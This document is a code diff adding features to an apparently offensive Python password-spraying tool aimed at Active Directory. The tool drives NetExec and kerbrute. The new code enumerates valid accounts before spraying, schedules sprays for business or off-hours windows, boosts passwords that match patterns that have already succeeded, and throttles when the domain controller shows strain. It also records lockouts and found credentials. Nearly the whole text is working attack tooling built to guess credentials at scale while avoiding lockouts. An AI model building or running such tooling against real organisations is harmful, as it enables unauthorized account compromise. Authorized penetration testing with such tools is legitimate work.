+    def seconds_until_open(self, now: Optional[datetime.datetime] = None) -> int:
+        """Seconds until next window opening (0 if inside)."""
+        if now is None:
+            now = datetime.datetime.now()
+
+        if self.is_in_window(now):
+            return 0
+
+        # Compute next opening time
+        if self.spec == "business-hours":
+            # Next Mon-Fri 09:00
+            candidate = now.replace(hour=9, minute=0, second=0, microsecond=0)
+            while candidate.weekday() not in self.days or candidate <= now:
+                candidate += datetime.timedelta(days=1)
+            return int((candidate - now).total_seconds())
+
+        elif self.spec == "off-hours":
+            # If weekday during business hours, next opening is today 17:00
+            # If weekday outside business hours or weekend, already in window
+            if now.weekday() in self.days and 9 * 60 <= now.hour * 60 + now.minute < 17 * 60:
+                candidate = now.replace(hour=17, minute=0, second=0, microsecond=0)
+                return int((candidate - now).total_seconds())
+            return 0
+
+        else:
+            # Custom range
+            candidate = now.replace(hour=self.start_minute // 60,
+                                    minute=self.start_minute % 60,
+                                    second=0, microsecond=0)
+            while (candidate.weekday() in self.days and self.days and
+                   candidate <= now):
+                candidate += datetime.timedelta(days=1)
+            return int((candidate - now).total_seconds())
+
+    def describe(self) -> str:
+        """Human-readable window description."""
+        if self.spec == "business-hours":
+            return "Mon-Fri 09:00-17:00"
+        elif self.spec == "off-hours":
+            return "Mon-Fri 17:00-09:00 + all weekend"
+        else:
+            return self.spec
+
+
+def wait_for_window(window: SprayWindow, ui: RichUI, console: Console, state: State):
+    """Wait until spray window opens (if outside). Records timeline event."""
+    if window.is_in_window():
+        return
+
+    seconds = window.seconds_until_open()
+    if seconds <= 0:
+        return
+
+    console.print(f"[*] Outside spray window ({window.describe()}); waiting until next window opens...", style="cyan")
+
+    # Record timeline event
+    open_time = datetime.datetime.now() + datetime.timedelta(seconds=seconds)
+    state.record_timeline_event("schedule_wait", f"Waiting {int(seconds//60)}m until {open_time.strftime('%H:%M')}")
+
+    ui.countdown(seconds)
 
 # =============================================================================
 # Failover chain building
@@ -969,6 +1672,20 @@ def run(cfg: Config, console: Console):
         console.print("[!] Aborting. Fix the issue or use --no-preflight to bypass (not recommended).", style="yellow")
         return
 
+    # Feature 2: Filter disabled/non-existent accounts if requested
+    if cfg.filter_disabled and not cfg.dry_run:
+        original_count = len(cfg.users)
+        cfg.users = enumerate_valid_users(cfg, ui, console)
+        filtered_count = len(cfg.users)
+        dropped = original_count - filtered_count
+
+        # Write filtered list to log dir
+        active_users_file = Path(cfg.log_dir) / "active-users.txt"
+        active_users_file.write_text("\n".join(cfg.users) + "\n")
+
+        console.print(f"[*] Filtered: {filtered_count} valid of {original_count} total ({dropped} non-existent dropped)", style="green")
+        console.print(f"[*] Active users saved to: {active_users_file}", style="cyan")
+
     # Initialize state
     state = State(cfg.log_dir, cfg)
 
@@ -990,15 +1707,31 @@ def run(cfg: Config, console: Console):
 
         console.print(f"\n[*] Round {round_idx + 1}: spraying {len(batch)} secret(s)", style="cyan")
 
+        # Feature E: Record round start timeline event
+        state.record_timeline_event("round_start", "", round_idx=round_idx + 1)
+
+        # Build batch info string to show what's being sprayed
+        passwords_to_spray = batch.copy()
+        next_passwords_preview = state.remaining_queue[:cfg.passwords_per_round]
+
         round_lockouts_this_round = 0
+        round_conn_fails_this_round = 0  # Feature D: Track conn fails per round
         round_errors_this_round = []  # Track all errors in this round
+        round_successes_this_round = []  # Track all successes in this round
 
         for secret in batch:
             # Try each engine in failover chain
             engine_success = False
             for engine in chain:
+                # Build batch info string
+                batch_info = f"Spraying {len(passwords_to_spray)} passwords (this round)"
+                if len(passwords_to_spray) > 1:
+                    batch_info += f": {passwords_to_spray[0][:20]}... ({len(passwords_to_spray)} total)"
+                else:
+                    batch_info += f": {passwords_to_spray[0][:30]}"
+
                 # Start spray UI
-                ui.start_spray(engine, secret, round_idx + 1)
+                ui.start_spray(engine, secret, round_idx + 1, batch_info)
                 state.record_spray_start(engine, secret, round_idx + 1)
 
                 # Run spray
@@ -1006,7 +1739,9 @@ def run(cfg: Config, console: Console):
 
                 # Record stats
                 round_lockouts_this_round += len(result.lockouts)
+                round_conn_fails_this_round += result.conn_fails  # Feature D: Accumulate conn fails
                 round_errors_this_round.extend(result.errors)  # Track errors
+                round_successes_this_round.extend(result.successes)  # Track successes
                 state.record_spray_end(
                     len(result.successes),
                     len(result.lockouts),
@@ -1035,13 +1770,49 @@ def run(cfg: Config, console: Console):
                 ui.alert("ALL ENGINES FAILED", "Could not spray this secret with any tool in the failover chain. Check network/DC. Press Enter to retry or Ctrl-C to abort.", "red")
                 input()  # Pause for operator
 
+            # Remove this password from the "to spray" list
+            if passwords_to_spray and passwords_to_spray[0] == secret:
+                passwords_to_spray.pop(0)
+
         # Mark secrets as used
         for secret in batch:
             state.mark_used(secret)
 
-        # Show round summary including errors
+        # Feature 3: Pattern learning - re-prioritize queue based on successful patterns
+        boosted = state.reprioritize_queue()
+        if boosted > 0:
+            # Get top successful patterns
+            top_patterns = sorted(state.success_by_pattern.items(), key=lambda x: x[1], reverse=True)[:3]
+            pattern_names = [pat for pat, _ in top_patterns]
+            console.print(f"[*] Re-prioritizing: boosting {boosted} password(s) matching successful pattern(s): {', '.join(pattern_names)}", style="cyan")
+            # Feature E: Record reprioritize timeline event
+            state.record_timeline_event("reprioritize", f"boosted {boosted} passwords", round_idx=round_idx + 1)
+
+        # Show round summary
         console.print(f"[*] Round {round_idx + 1} complete:", style="cyan")
         console.print(f"    - Lockouts: {round_lockouts_this_round}", style="yellow" if round_lockouts_this_round > 0 else "dim")
+        console.print(f"    - Found credentials: {len(round_successes_this_round)}", style="green" if round_successes_this_round else "dim")
+
+        # Feature 4: Show compact stats line
+        console.print(f"    - {state.get_compact_stats()}", style="cyan")
+
+        # Show last password sprayed and next passwords to spray
+        if batch:
+            last_pw = batch[-1]
+            console.print(f"    - Last password sprayed: {last_pw}", style="cyan")
+        else:
+            console.print(f"    - Last password sprayed: (none)", style="dim")
+
+        if next_passwords_preview:
+            next_list_str = ", ".join(next_passwords_preview)
+            console.print(f"    - Next password(s) to spray: {next_list_str}", style="cyan")
+        elif state.remaining_queue:
+            # There are more passwords but less than a full batch
+            console.print(f"    - Next password(s) to spray: {', '.join(state.remaining_queue)}", style="cyan")
+        else:
+            console.print(f"    - Next password(s) to spray: <end of file>", style="dim")
+
+        # Show error messages if any
         if round_errors_this_round:
             console.print(f"    - Errors: {len(round_errors_this_round)}", style="red")
             console.print("      Error messages:", style="red")
@@ -1063,17 +1834,27 @@ def run(cfg: Config, console: Console):
             ui.alert("CRITICAL ERRORS", "Tool reported domain/realm errors. Check your -d domain parameter. Press Enter to continue or Ctrl-C to abort.", "red")
             input()  # Pause for operator
 
+        # Feature D: Update throttle based on this round's conn fails
+        throttle_mult = state.update_throttle(round_conn_fails_this_round)
+        if throttle_mult > 1.0:
+            console.print(f"    [*] Throttling: {throttle_mult:.1f}x inter-round delay (DC stress detected)", style="yellow")
+            # Feature E: Record throttle timeline event
+            state.record_timeline_event("throttle", f"multiplier now {throttle_mult:.1f}x", round_idx=round_idx + 1)
+
         # Countdown if more passwords remain
         if state.remaining_queue:
-            console.print(f"[*] Sleeping {cfg.time_between_rounds} minutes until next round...", style="cyan")
-            ui.countdown(cfg.time_between_rounds * 60)
+            # Feature B: Spray window scheduling - wait if outside window
+            if cfg.schedule:
+                window = SprayWindow(cfg.schedule)
+                wait_for_window(window, ui, console, state)
 
-        round_idx += 1
+            # Feature D: Apply throttle multiplier to delay
+            effective_delay = int(cfg.time_between_rounds * state.delay_multiplier)
+            console.print(f"[*] Sleeping {effective_delay} minutes until next round...", style="cyan")
+            ui.countdown(effective_delay * 60)
 
-        # Countdown if more passwords remain
-        if state.remaining_queue:
-            console.print(f"[*] Sleeping {cfg.time_between_rounds} minutes until next round...", style="cyan")
-            ui.countdown(cfg.time_between_rounds * 60)
+        # Feature E: Record round end timeline event
+        state.record_timeline_event("round_end", f"round {round_idx + 1} complete", round_idx=round_idx + 1)
 
         round_idx += 1
 
@@ -1081,6 +1862,32 @@ def run(cfg: Config, console: Console):
     console.print("\n[+] Spray complete.", style="green")
     console.print(f"[+] Found credentials: {len(state.found_creds)}", style="green")
     console.print(f"[+] Total lockouts: {len(state.locked_users)}", style="yellow")
+
+    # Feature E: Record complete timeline event
+    state.record_timeline_event("complete", "spray finished")
+
+    # Feature 4: Show full stats dashboard
+    console.print("\n")
+    console.print(state.render_stats(console))
+
+    # Feature 5: Export results (always export at end for audit trail)
+    console.print(f"\n[*] Exporting results...", style="cyan")
+
+    # Export timeline.json (always)
+    timeline_json = state.log_dir / "timeline.json"
+    timeline_json.write_text(json.dumps(state.timeline_events, indent=2))
+    console.print(f"[+] Timeline exported to: {timeline_json}", style="cyan")
+
+    # Export HTML timeline if --timeline set
+    if cfg.timeline or cfg.export == "all":
+        timeline_html = state.log_dir / "spray-timeline.html"
+        timeline_html.write_text(state.render_timeline_html())
+        console.print(f"[+] Timeline HTML exported to: {timeline_html}", style="cyan")
+
+    state.export_results("json")
+    state.export_results("csv")
+    console.print(f"[+] Results exported to: {state.log_dir}/results.json and results.csv", style="green")
+
     console.print(f"[+] Credentials saved to: {state.creds_file}", style="cyan")
     console.print(f"[+] Lockouts saved to: {state.lockouts_file}", style="cyan")
     console.print(f"[+] Overall log: {state.overall_log}", style="cyan")
@@ -1142,6 +1949,12 @@ For authorized penetration testing only.
     parser.add_argument("--no-preflight", action="store_true", help="Skip DC/domain preflight check")
     parser.add_argument("--log-dir", default="./spraygun-out", help="Output/state directory (default: ./spraygun-out)")
 
+    # New operator fundamentals
+    parser.add_argument("--filter-disabled", action="store_true", help="Pre-spray kerbrute userenum to filter non-existent accounts")
+    parser.add_argument("--export", choices=["none", "json", "csv", "all"], default="none", help="Export results format (default: none)")
+    parser.add_argument("--schedule", help="Spray window: business-hours, off-hours, or HH:MM-HH:MM (default: unrestricted)")
+    parser.add_argument("--timeline", action="store_true", help="Generate spray-timeline.html visualization")
+
     args = parser.parse_args()
 
     # Validate inputs
@@ -1191,6 +2004,10 @@ For authorized penetration testing only.
         dry_run=args.dry_run,
         no_preflight=args.no_preflight,
         log_dir=args.log_dir,
+        filter_disabled=args.filter_disabled,
+        export=args.export,
+        schedule=args.schedule or "",
+        timeline=args.timeline,
         nxc_binary=nxc_bin,
         kerbrute_binary=kerbrute_bin,
     )
